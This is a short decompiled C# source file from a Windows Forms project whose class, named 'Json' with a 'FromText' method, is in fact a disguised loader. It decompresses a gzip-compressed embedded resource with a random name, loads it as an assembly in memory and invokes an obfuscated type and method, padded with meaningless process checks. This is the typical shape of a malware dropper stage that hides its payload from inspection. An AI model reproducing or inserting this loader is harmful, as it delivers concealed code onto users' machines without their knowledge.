using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using WindowsFormsApp1.Properties;

namespace WindowsFormsApp1;

internal class Json
{
	internal void FromText()
	{
		byte[] array = Gziper(Resources.Tfefcxrqcymnpyqfdstaplxp);
		if (array == null)
		{
			return;
		}
		Assembly assembly = Assembly.Load(array);
		if (Process.GetCurrentProcess().Id > 0)
		{
			Type type = assembly.GetType("n5C8vislHThN0tNA6YL.IqAPfNsFYX7qgNcEDrm");
			if (!Process.GetCurrentProcess().HasExited)
			{
				Console.WriteLine(type.InvokeMember("CEVsVwOTA9", BindingFlags.InvokeMethod, null, null, null));
			}
		}
	}

	internal byte[] Gziper(byte[] data)
	{
		using MemoryStream stream = new MemoryStream(data);
		using MemoryStream memoryStream = new MemoryStream();
		using BufferedStream bufferedStream = new BufferedStream(new GZipStream(stream, CompressionMode.Decompress));
		bufferedStream.CopyTo(memoryStream);
		return memoryStream.ToArray();
	}
}
